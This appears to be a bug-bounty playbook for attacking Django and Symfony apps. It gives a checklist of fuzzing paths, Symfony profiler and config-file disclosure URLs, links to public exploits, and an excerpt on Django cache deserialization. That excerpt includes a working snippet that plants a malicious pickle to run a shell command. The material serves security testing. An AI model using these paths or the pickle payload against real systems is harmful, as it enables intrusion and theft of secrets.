# Real-World Playbook — Framework-Specific (Django / Symfony)

**Class:** `framework` · **Coverage-matrix tier:** 2 · **Hunter2:** recon · sast_scan.py · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Test flow / checklist — do these in order
*(imported from Az0x7/vulnerability-Checklist; run each, mark result in the coverage matrix)*

1-Rce
```
https://medium.com/@syedabuthahir/django-debug-mode-to-rce-in-microsoft-acquisition-189d27d08971
```

2- Exposing Django Debug Panel
`
https://hackerone.com/reports/2078707
`
```
/app/tmp/healthcheck.json
/fxa-rp-events

template:
https://github.com/Az0x7/vulnerability-Checklist/blob/main/Hacking%20Django/exposing-django.yaml
```


3- use this wordlist for fuzzing
```
https://github.com/six2dez/OneListForAll/blob/main/dict/django_long.txt
```

4- fuzz with path

```
/bet_api
/healthcheck
/oidc
rest-api/
api-soap/ 
api/v1/ums/
api/v1/dms/
api/v1/transaction/
api/v1/log/
api/v1/reports/
api/v1/organization/
api/v1/legal_entity/
api/v1/tpdr/
api/v1/integral_docs/
api/v1/countries
```

1-Rce
```
https://medium.com/@bxrowski0x/3-symfony-rce-a-peek-behind-the-curtain-83da5433e149
```

2- use tool  eos
```
https://github.com/Synacktiv/eos
```


3- path with sensative data disclosure
```
/_profiler
/app_dev.php/_profiler
/app_dev.php
/_profiler/empty/search/results?limit=10
/app_dev.php/_profiler/
/app_dev.php/_profiler/phpinfo
/app_dev.php/_profiler/open?file=app/config/parameters.yml
/app/config/config_test.yml
/_fragment
/_internal
/_proxy
```

4- secret fragment exploit
```
https://github.com/ambionics/symfony-exploits
http://web.archive.org/web/20230708081739/https://www.ambionics.io/blog/symfony-secret-fragment
```

5-use nuclie template 
```
https://github.com/Az0x7/vulnerability-Checklist/blob/main/Hacking%20Symfony/template_1.yaml
https://github.com/Az0x7/vulnerability-Checklist/blob/main/Hacking%20Symfony/template_2.yaml
https://github.com/Az0x7/vulnerability-Checklist/blob/main/Hacking%20Symfony/template_3.yaml
https://github.com/Az0x7/vulnerability-Checklist/blob/main/Hacking%20Symfony/template_4.yaml

```
6- fuzz with 
```
https://github.com/six2dez/OneListForAll/blob/main/dict/symphony_long.txt
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Django


#### Cache Manipulation to RCE
Django's default cache storage method is [Python pickles](https://docs.python.org/3/library/pickle.html), which can lead to RCE if [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf). **If an attacker can gain write access to the cache, they can escalate this vulnerability to RCE on the underlying server**.<sup>[[11]](#references)</sup>

Django cache is stored in one of four places: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), or a [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95). Cache stored in a Redis server or database are the most likely attack vectors (Redis injection and SQL injection), but an attacker may also be able to use file-based cache to turn an arbitrary write into RCE. Maintainers have marked this as a non-issue. It's important to note that the cache file folder, SQL table name, and Redis server details will vary based on implementation.

On **FileBasedCache**, the pickled value is written to a file under `CACHES['default']['LOCATION']` (often `/var/tmp/django_cache/`). If that directory is world-writable or attacker-controlled, dropping a malicious pickle under the expected cache key yields code execution when the app reads it:<sup>[[8]](#references)</sup>

```bash
python - <<'PY'
import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ("id >/tmp/pwned",))
open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))
PY
```

This HackerOne report provides a great, reproducible example of exploiting Django cache stored in a SQLite database: https://hackerone.com/reports/1415436<sup>[[12]](#references)</sup>


*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Debug mode → source/secret leak → SSTI/RCE
- Framework default routes / _profiler / admin

## Hunter2 wiring
- **Run:** `recon · sast_scan.py`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 2 (Tier 0 = test first)
